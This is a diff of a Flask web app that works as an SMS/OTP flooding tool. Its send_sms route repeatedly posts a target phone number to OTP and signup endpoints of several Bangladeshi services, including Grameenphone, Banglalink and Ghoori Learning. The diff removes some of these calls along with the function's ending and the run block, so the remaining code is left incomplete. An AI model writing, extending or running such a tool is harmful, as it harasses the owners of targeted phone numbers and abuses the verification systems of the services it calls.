@@ -1,3 +1,4 @@
+import os
 from flask import Flask, request, render_template_string
 import requests
 import time
@@ -202,27 +203,3 @@ def send_sms():
 
             requests.post("https://webloginda.grameenphone.com/backend/api/v1/otp",
                           json={"phone": number})
-
-            # নতুন API গুলো
-            requests.get("https://api.kabbik.com/v4/session/log-kabbik?play=false")
-
-            requests.post(
-                "https://api.ghoorilearning.com/api/auth/signup/otp?_app_platform=web",
-                json={"phone": number}
-            )
-
-            requests.post(
-                "https://user.applink.com.bd/registration-api/api/v3/banglalink/profile/sp",
-                json={"msisdn": number}
-            )
-
-            success_count += 1
-            time.sleep(1)
-
-        except Exception as e:
-            print(f"Error {i+1}: {e}")
-
-    return f"✅ {success_count} request(s) sent to {number}."
-
-if __name__ == "__main__":
-    app.run(debug=True)
